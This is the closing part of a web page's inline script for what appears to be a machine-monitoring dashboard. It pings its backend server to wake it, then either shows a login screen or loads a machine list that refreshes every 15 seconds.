        console.log("Pinging server...");
        try {
          // We hit the base URL or your new /ping endpoint
          await axios.get("https://systemint.onrender.com/ping");
          console.log("Server is awake! üöÄ");
        } catch (e) {
          console.warn(
            "Server is sleeping or offline. Initial request sent to wake it up.",
          );
          // Optional: Show a "Waking up server..." message to the user
        }
        // -----------------------

        if (authToken) {
          loginScreen.style.display = "none";
          loadMachines();
        } else {
          loginScreen.style.display = "flex";
        }
      }

      // Run on start
      init();

      setInterval(loadMachines, 15000);
    </script>
  </body>
</html>
